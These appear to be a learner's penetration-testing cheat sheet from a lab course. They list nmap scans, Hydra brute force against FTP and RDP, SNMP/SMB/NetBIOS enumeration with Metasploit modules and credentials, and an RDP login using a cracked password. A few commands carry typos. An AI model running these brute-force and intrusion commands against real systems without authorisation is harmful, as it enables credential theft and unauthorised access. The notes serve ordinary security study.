**Scanning Network using Nmap**

Scanning network Live Host (ping sweep): nmap -sP IP/CIDR  
Scanning Live Host without port scan in same subnet (ARP scan) : nmap -PR -sn IP/CIDR
Scripts + Version running on target machine: nmap -sC -sV IP/CIDR  
OS of the target: nmap -O IP  
All open ports of the target: nmap -p- IP/CIDR  
Specific port scan of the target: nmap -p<port-number> IP/CIDR  
Aggressive Scan: nmap -A IP/CIDR  
Scanning using NSE scripts: nmap --scripts <script_name> -p <port> IP/CIDR  
Scripts + Version + Ports + OS Scan (Overall): nmap -sc -sv -p- -A -v -T4 IPICIDR  

**Brute force ftp**  
nmap -sc -p 21 192.135.117.3  
hydra -L /usr/share/wordlists/metasploit/canron_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.135.117.3 ftp  

**SNMP Check-enumeration**  
snmp-check 192.151.62.3 
nmap -sU -p 161 --script=smnp-processes 192.151.62.3  

**SNMP Exploit**  
msf5 > use auxiliary/scanner/snmp/snmp_login  
set RHOSTS 192.151.62.3
exploit  

**SMB Enumeration**  
nmap 10.4.29.134 (smb runns on 445 port)  
nmap -p 445 --script smb-enum-shares 10.4.29.134  
next step to Connect SMB using GUI Method  
next step Gredentials from ftp step  

**Enumerating users**  
nmap -p 445 --script smb-enum-users 10.4.29.134  
nmap -p 445 --script smb-enum-users --script-args smbusername=administrator, smbpassword=smbserver_771 10.4.29.134 (getting users from machine)    
nmap -p 445 --script smb-enum-groups --script-args smbusername=administrator, smbpassword=smbserver_771 10.4.29.134 (getting groups and users from machine)  

**What to Hack?**  
Network File shares  
Logged in Users details  
Workgroups  
security level informationl  
Domains & Services  

nmap -sC -sV -A -T4 -p445 10.4.29.134  
nmap -p 445 --script smb-enum-services --script-args smbusername=administrator, smbpassword=smbserver_771 10.4.29.134  

**Exploiting RDP Service**  
Remote Desktop Protocol : 3389  
Protocol used for remotely accessing the computers  

msfconsole  
use auxiliary/scanner/rdp/rdp_scanner  
set RHOSTS 10.5.17.119  
set RPORT 3333  
exploit (it show if RDP is running on this target)  
next step is to run Hydra tool to brute force  
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://lO.5.17.119 -s 3333  
next step to initialize an RDP session  
xfreerdp /u:administrator /p:qwertyuiop /v: 10.5.17.119:3333  

**NetBIOS Enumeration**  
Port - 137/138/139  
NBName: 137/UDP  
NBName: 137/TCP  
NBDatagram: 138/UDP  
NBSession: 139/TCP  
Network Basic Input Output System  
Facilitates and allows computer to connect over the local network, access shared
resources, such as files and printers, and to find each other.  

nmap -sV --script nbstat.nse 192.72.120.3  



